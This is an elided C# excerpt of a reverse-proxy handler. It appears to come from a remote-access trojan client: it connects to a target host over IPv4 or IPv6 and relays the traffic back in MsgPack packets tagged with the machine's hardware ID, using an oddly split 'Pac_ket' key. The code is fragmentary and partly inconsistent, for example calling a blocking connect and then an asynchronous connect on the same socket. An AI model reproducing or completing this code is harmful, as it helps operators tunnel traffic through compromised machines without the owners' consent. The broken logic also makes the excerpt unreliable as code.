...
namespace ReverseProxy.Handler
{
    public class HandleReverseProxy
    {
        ...
        public Socket HandleV6 { get; private set; }
        ...
        public HandleReverseProxy(int ConnectionId, string Target, int Port)
        {
            ...
            this.HandleV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
            if (IPAddress.TryParse(Target, out IPAddress i4or6))
            {
                switch (i4or6.AddressFamily)
                {
                    case System.Net.Sockets.AddressFamily.InterNetwork:
                        Handle.Connect(Target, Port);
                    ...
                    case System.Net.Sockets.AddressFamily.InterNetworkV6:
                        HandleV6.Connect(Target, Port);
                        this.HandleV6.BeginConnect(Target, Port, Handle_Connect, null);
                        //Non-Blocking connect, so there is no need for a extra thread to create
                        if (HandleV6.Connected)
                        {
        ...
        private void Handle_Connect(IAsyncResult ar)
        {
            ...
            {
                if (this.HandleV6.Connected)
                {
                    try
                    {
                        this._buffer = new byte[BUFFER_SIZE];
                        this.HandleV6.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                    }
                    catch
                    {
                        MsgPack msgpack = new MsgPack();
                    ...
                    IPEndPoint localEndPoint = (IPEndPoint)this.HandleV6.LocalEndPoint;
                    MsgPack msgpack1 = new MsgPack();
                    msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                    msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                    msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
        ...
        private void AsyncReceive(IAsyncResult ar)
        {
            ...
            try
            {
                ...
                int receivedV6 = HandleV6.EndReceive(ar);
                if (received <= 0 && receivedV6 <= 0)
                {
                    Disconnect();
                    return;
                }
                ...
                { 
                    byte[] payload = new byte[receivedV6];
                    Array.Copy(_buffer, payload, receivedV6);
                    msgpack1.ForcePathObject("Data").SetAsBytes(payload);
                }
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
